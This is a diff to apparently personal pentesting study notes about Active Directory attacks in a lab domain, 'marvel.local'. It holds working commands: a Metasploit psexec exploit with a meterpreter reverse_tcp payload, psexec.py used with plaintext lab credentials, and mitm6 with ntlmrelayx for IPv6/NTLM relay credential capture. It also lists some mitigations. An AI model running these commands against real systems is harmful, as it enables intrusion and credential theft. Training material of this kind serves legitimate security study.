@@ -129,30 +129,61 @@
 
 * Gaining Shell Access:
 
-```shell
-#this step has to be done once we have the credentials
-msfconsole
+  ```shell
+  #this step has to be done once we have the credentials
+  msfconsole
 
-search psexec
+  search psexec
 
-use exploit/windows/smb/psexec
+  use exploit/windows/smb/psexec
 
-options
-#set all required options
-#such as RHOSTS, smbdomain, smbpass and smbuser
+  options
+  #set all required options
+  #such as RHOSTS, smbdomain, smbpass and smbuser
 
-set payload windows/x64/meterpreter/reverse_tcp
+  set payload windows/x64/meterpreter/reverse_tcp
 
-set LHOST eth0
+  set LHOST eth0
 
-run
-#run exploit
-```
+  run
+  #run exploit
+  ```
 
-```shell
-#we can use another tool called psexec.py
-psexec.py marvel.local/fcastle:Password1@192.168.57.141
+  ```shell
+  #we can use another tool called psexec.py
+  psexec.py marvel.local/fcastle:Password1@192.168.57.141
 
-#try multiple options if these tools do not work
-#such as smbexec and wmiexec
-```
+  #try multiple options if these tools do not work
+  #such as smbexec and wmiexec
+  ```
+
+* IPv6 Attacks (refer [mitm6 attacks](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) and [NTLM relays](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/) for more info):
+
+  ```shell
+  #download and setup the mitm6 tool
+
+  #setup LDAPS as well
+
+  mitm6 -d marvel.local
+
+  #setup relay
+  ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootme
+  #generate activity on Windows machine by rebooting it
+  #this dumps info in another directory
+
+  ls lootme
+  #contains useful info
+  #if we keep the program running in background, and the user logins, the creds can be captured
+  ```
+
+  * Mitigation:
+
+    * Block DHCPv6 traffic and incoming router advertisements.
+
+    * Disable WPAD via Group Policy.
+
+    * Enable both LDAP signing and LDAP channel binding.
+
+    * Mark Admin users as Protected Users or sensitive accounts.
+
+* [Pass-Back attacks](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack) can be used for printer hacking.
